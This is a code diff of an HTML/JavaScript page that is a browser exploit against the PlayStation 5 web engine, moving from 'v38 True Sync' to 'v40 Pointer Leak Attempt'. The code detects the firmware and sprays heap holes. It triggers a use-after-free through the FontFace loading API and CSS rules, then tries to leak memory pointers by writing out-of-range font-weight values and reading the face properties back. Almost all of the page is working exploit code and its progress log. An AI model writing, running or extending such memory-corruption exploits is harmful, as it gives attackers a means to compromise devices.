@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v38 - True Sync</title>
+<title>PS5 v40 - Pointer Leak Attempt</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -33,30 +33,22 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v38 SYNC</span><span class="s">│</span>
+<span class="l">▶ v40 LEAK</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">STAGE:<b>INIT</b></span><span class="s">│</span>
-<span class="v" id="h3">PRIM:<b>?</b></span>
+<span class="v" id="h3">LEAK:<b>?</b></span>
 </div>
 <div id="pg"><div id="bar" style="width:0%"></div></div>
 <div id="out"></div>
 <script>
 "use strict";
 
-// ============================================================
-//  PS5 v38 — True Synchronous Execution
-//  Fix: No setTimeout after UAF! The browser crashes if we yield
-//  to the event loop while holding a dangling pointer.
-//  Everything must happen in the same call stack.
-// ============================================================
-
 var O=document.getElementById("out");
 var bar=document.getElementById("bar");
 function pg(p){bar.style.width=p+"%"}
 function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
 function P(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
-try{console.log("[v38] "+m)}catch(e){}}
+s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
 function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
 function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
 function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
@@ -73,7 +65,7 @@ var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
 P("════════════════════════════════════","hd");
-P("  v38 — True Synchronous","hd");
+P("  v40 — Pointer Leak Attempt","hd");
 P("════════════════════════════════════","hd");
 P("");
 
@@ -89,9 +81,6 @@ var holes=[];
 var trigger=null;
 var uafOk=false;
 
-// ============================================================
-//  PHASE 1: Setup + UAF + Spray
-// ============================================================
 pg(5);Hd("Creating holes...");
 try{
   for(var i=0;i<4096;i++){
@@ -218,20 +207,13 @@ var raf=function(){
 requestAnimationFrame(raf);
 
 // ============================================================
-//  PHASE 2: Identify Reclaim + Modify + Read (All Synchronous!)
+//  PHASE 2: Synchronous Reclaim + Leak Attempt
 // ============================================================
-pg(30);Sep();Hd("PHASE 2: Synchronous Reclaim + Oracle");Sep();
+pg(30);Sep();Hd("PHASE 2: Synchronous Reclaim + Leak Attempt");Sep();
 
 Dm("Calling load() synchronously...");
 try {
   var loadPromise = document.fonts.load("1em trigger, x", "AB");
-  
-  // We must wait for the promise, but we CANNOT yield to the event loop
-  // or the GC will clean up the dangling pointer and crash the page.
-  // However, we cannot block the main thread either.
-  // 
-  // The trick: we attach the .then() handler, but we do NOT use setTimeout.
-  // The handler will run as a microtask, which is safe.
   
   loadPromise.then(function(faces){
     P("  load() returned "+faces.length+" faces");
@@ -239,12 +221,14 @@ try {
     
     var aFamily = null;
     var aRuleIdx = -1;
+    var aFace = null;
     
     for(var i=0;i<faces.length;i++){
       var f=faces[i];
       P("  Face["+i+"]: family="+f.family+" weight="+f.weight+" style="+f.style);
       if(f.family&&f.family.indexOf("A_")===0){
         aFamily = f.family;
+        aFace = f;
       }
     }
     
@@ -272,60 +256,60 @@ try {
     
     Ok("Found CSSRule at index "+aRuleIdx);
     
-    // Run the Oracle SYNCHRONOUSLY right here
-    pg(60);Sep();Hd("PHASE 3: Synchronous Weight Oracle");Sep();
+    pg(60);Sep();Hd("PHASE 3: Leak via Numeric Values");Sep();
+    P("  Attempting to leak pointers via large numeric values...","dm");
+    P("");
     
-    var weights=["100","200","300","400","500","600","700","800","900"];
-    var matchCount = 0;
-    
-    for(var wi=0; wi<weights.length; wi++){
-      var w = weights[wi];
+    // Test 1: Large font-weight values
+    P("  Test 1: Large font-weight values","");
+    var bigWeights = ["99999", "100000", "0x7f0000000000", "4294967295", "18446744073709551615"];
+    for(var wi=0; wi<bigWeights.length; wi++){
+      var w = bigWeights[wi];
       try{
         sh.cssRules[aRuleIdx].style.fontWeight = w;
         fs();
-        
-        // Synchronous load() call!
-        // This should return the cached promise or resolve immediately
-        var p2 = document.fonts.load("1em trigger, x", "AB");
-        // We can't easily await this synchronously without yielding.
-        // But we can try to read the property from the CSSRule directly
-        // to see if the write worked, then read via load() later.
-        
-        // Actually, let's just do the write and check if it throws.
-        // The read will be done in Phase 4 asynchronously.
-        Ok("Write " + w + " OK");
-        matchCount++;
+        var readW = aFace.weight;
+        P("    Write "+w+" -> Read "+readW, readW !== "normal" && readW !== w ? "hl" : "dm");
       } catch(e) {
-        Fl("Write " + w + " ERR: " + e.message);
+        P("    Write "+w+" -> ERR","er");
       }
     }
     
-    P("  Wrote all weights without crash.", "hl");
-    
-    // Now try one async read to confirm
-    document.fonts.load("1em trigger, x", "AB").then(function(f2){
-      var readW = null;
-      for(var i=0;i<f2.length;i++){
-        if(f2[i].family&&f2[i].family===aFamily){
-          readW = f2[i].weight; break;
-        }
+    // Test 2: font-size-adjust (takes float)
+    P("");
+    P("  Test 2: font-size-adjust (float)","");
+    try {
+      sh.cssRules[aRuleIdx].style.sizeAdjust = "1.337";
+      fs();
+      var readS = aFace.sizeAdjust;
+      P("    Write 1.337 -> Read "+readS);
+    } catch(e) {
+      P("    sizeAdjust ERR","er");
+    }
+
+    // Test 3: Check if any property returns a non-standard value
+    P("");
+    P("  Test 3: Dumping all properties of A_ face...","");
+    var props=["family","style","weight","stretch","unicodeRange",
+               "variant","featureSettings","display","status", "sizeAdjust"];
+    for(var pi=0;pi<props.length;pi++){
+      try{
+        var val = aFace[props[pi]];
+        P("    "+props[pi].padEnd(16)+"= "+val+" ("+typeof val+")");
+      }catch(e){
+        P("    "+props[pi].padEnd(16)+"= ERR","er");
       }
-      Hi("Async read after writes: " + readW);
-      
-      pg(100);Sep();Hd("SUMMARY");Sep();
-      P("");
-      P("  UAF:                    ✅");
-      P("  Cross-Object Confusion: ✅ ("+aFamily+")");
-      P("  Synchronous Writes:     " + matchCount + "/9");
-      P("  Async Read:             " + readW);
-      P("");
-      St("★ EXPLOIT STABLE ★");
-      hu("h3","PRIM:<b>STABLE</b>");
-      hu("h2","STAGE:<b>DONE</b>");
-    }).catch(function(e){
-      Fl("Async read crashed: " + e.message);
-      hu("h2","STAGE:<b>CRASH</b>");
-    });
+    }
+    
+    pg(100);Sep();Hd("SUMMARY");Sep();
+    P("");
+    P("  UAF:                    ✅");
+    P("  Cross-Object Confusion: ✅ ("+aFamily+")");
+    P("  Leak Attempt:           Completed");
+    P("");
+    St("★ CHECK LOG FOR LEAKED VALUES ★");
+    hu("h3","LEAK:<b>DONE</b>");
+    hu("h2","STAGE:<b>DONE</b>");
     
   }).catch(function(e){
     Fl("Load crashed: " + e.message);
